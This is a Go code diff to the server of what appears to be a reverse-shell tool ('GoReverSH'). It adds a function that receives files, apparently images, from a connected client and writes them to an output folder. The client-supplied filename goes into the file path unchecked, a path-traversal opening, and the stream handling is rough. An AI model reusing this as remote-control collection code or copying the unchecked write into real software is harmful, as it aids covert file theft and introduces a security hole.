@@ -1,9 +1,15 @@
 package server
 
 import (
+	"GoReverSH/utils"
 	"context"
+	"encoding/json"
 	"fmt"
+	"io"
 	"log"
+	"net"
+	"os"
+	"strings"
 	"sync"
 )
 
@@ -71,10 +77,14 @@ func (observer Observer) WaitNotice(ctx context.Context) error {
 				observer.Sender.SendMessage(notice.Command)
 
 				//ファイル名
-				//downloadFiles()
 				//画像を受け取り
+				err := downloadFiles(observer.Sender.connectingClient.Conn)
+				if err != nil {
+					log.Fatalln(err)
+				}
 
 				observer.Lock.Unlock()
+				fmt.Println("finished")
 				observer.printPrompt()
 
 				//30
@@ -95,4 +105,72 @@ func (o Observer) printPrompt() {
 	} else {
 		fmt.Println("wait...")
 	}
+}
+
+//先にサイズを受け取る
+//サイズ分のバッファを確保
+//読み込む
+//バッファ分読み込んだら、次のファイル
+//サイズ0、名前空、中身なしの場合終了
+func downloadFiles(conn net.Conn) error {
+	for {
+		output := utils.Output{}
+
+		fileInfoBuff := make([]byte, 1024)
+		n, err := conn.Read(fileInfoBuff)
+		if err != nil {
+			log.Fatalln(err)
+			break
+		}
+
+		data := strings.Trim(string(fileInfoBuff[:n]), ":")
+
+		//err := json.NewDecoder(conn).Decode(&output)
+		fmt.Println(string(data))
+		err = json.Unmarshal([]byte(data), &output)
+		if err != nil {
+			log.Fatalln(err)
+			break
+		}
+		fmt.Println(output)
+
+		if output.Type == utils.FIN {
+			log.Fatal()
+			break
+		}
+
+		//TODO 出力フォルダは設定ファイルに記載
+		outdir := "./output/"
+		f, err := os.Create(outdir + output.FileInfo.Name)
+		if err != nil {
+			log.Fatalln(err)
+			break
+		}
+
+		/*
+			var content []byte
+			buff := make([]byte, 1024)
+			size := 0
+
+			for int64(size) < output.FileInfo.Size {
+				n, err := conn.Read(buff)
+				if err != nil {
+					break
+				}
+				tmp := make([]byte, 0, size+n)
+				tmp = append(content[:size], buff[:n]...)
+				content = tmp
+				size += n
+			}
+		*/
+
+		//fileInfoのWriteが消されてしまう
+		_, err = io.Copy(f, conn)
+		if err != nil {
+			break
+		}
+
+		f.Close()
+	}
+	return nil
 }
